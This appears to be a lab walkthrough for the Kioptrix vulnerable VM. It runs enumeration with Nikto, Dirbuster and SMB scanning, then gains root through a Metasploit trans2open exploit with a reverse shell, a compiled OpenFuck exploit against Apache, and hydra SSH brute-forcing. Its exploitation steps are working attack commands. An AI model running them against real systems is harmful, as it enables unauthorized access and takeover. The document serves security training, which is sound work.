ðŸ’¡ If the page is a default page, there are two things to think about
1) Are there any directories behind this?

2) running ********Nikto******** to test out if there are any web vulnerabilities.

ðŸ’¡ We can observe that this is vulenrable to DDoS, buffer overflows, remote shell, XSS, cross site tracing.

</aside>

3) Next Step is ****************************************************************Directory Enumeration. Dirbuster**************************************************************** is the best tool for the task.

![Untitled](walkthrough_resources/Untitled%201.png)

As Results come by, we keep enumerating all site and collecting any information we can get.

4) The next target is the ********SMB******** port. We will use ********************Metasploit for this.********************

```jsx
> msfconsole
> search smb type:axuiliary
> use auxiliary/scanner/smb/smb_version
> set RHOSTS 192.168.1.109
> run
```

Results:

```jsx
[*] 192.168.1.109:139     - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.1.109:139     -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.1.109:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

5) We can try to connect to the system using ********************smbclient.********************

<aside>
ðŸ’¡ Lets try to connect anaonymously
**smbclient -L \\\\192.168.1.109\\**

</aside>

Results:

```jsx
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Sharename       Type      Comment

        ---------            -------
        MYGROUP              KIOPTRIX
```

<aside>
ðŸ’¡ From this, there are two shares we can connect to but may need password for each.

</aside>

6) The Next Target is ******************SSH port.******************

<aside>
ðŸ’¡ ssh 192.168.1.109 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc

</aside>

Doesnt get us a lot of useful results since it needs a password

# ***EXPLOITATION***

## 1) Using Metasploit

```jsx
> msfconsole
> search trans2open
> use 1 (linux version)
> set RHOSTS 192.168.1.109
> exploit
// it starts dying maybe staged payloard isnt a good option
> set payload linux/x86/shell_reverse_tcp
> exploit
// in a small while, it shows the root terminal
>whoami
root
```

## 2) Manual Exploitation

```jsx
//Download Exploit
>git clone https://github.com/heltonWernik/OpenFuck.git
// install req
>apt-get install libssl-dev
//get into the repo and compile
>cd OpenFuck
> gcc -o OpenFuck OpenFuck.c -lcrypto
//From Enumeration phase, we know that the server being run is Apache 1.3.20
// so we use that hex 0x6b
> ./OpenFuck 0x6b 192.168.1.109 -c 40

```

And thats it, we have root.

## 3) Bruteforcing SSH

```jsx
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.109:22 -t 4 -V
```

-l â‡’ username

-P â‡’ password list

-t â‡’ thread

-V â‡’ verbosity

OR

```jsx
>msfconsole
> search ssh
> use 48
> set rhosts 192.168.1.109
> set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
> set username root
> exploit
```
